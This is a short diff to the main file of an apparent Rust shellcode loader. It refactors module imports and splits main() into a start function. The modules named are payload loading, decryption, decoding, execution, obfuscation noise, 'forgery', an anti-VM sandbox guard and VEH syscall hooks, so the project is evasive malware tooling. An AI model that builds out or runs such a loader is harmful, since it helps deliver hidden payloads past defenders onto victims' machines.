@@ -5,21 +5,18 @@ mod exec;
 mod decrypt;
 mod alloc_mem;
 mod decode;
-
-#[cfg(feature = "debug")]
-use utils::{print_error, print_message};
+#[cfg(feature = "with_forgery")]
+mod forgery;
+#[cfg(feature = "sandbox")]
+mod guard;
 
 use utils::obfuscation_noise;
 use load_payload::load_payload;
 use decrypt::decrypt;
 use decode::decode_payload;
 use exec::exec;
-
-#[cfg(feature = "with_forgery")]
-mod forgery;
-
-#[cfg(feature = "sandbox")]
-mod guard;
+#[cfg(feature = "debug")]
+use utils::{print_error, print_message};
 
 fn exit_program() -> ! {
     #[cfg(feature = "veh_syscall")]
@@ -27,12 +24,16 @@ fn exit_program() -> ! {
     std::process::exit(1);
 }
 
-fn main() {
+fn start_program() {
     #[cfg(feature = "debug")]
     print_message("RSL started in debug mode.");
 
     #[cfg(feature = "veh_syscall")]
     rust_veh_syscalls::initialize_hooks();
+}
+
+fn main() {
+    start_program();
 
     #[cfg(feature = "sandbox")]
     if guard::guard_vm() {
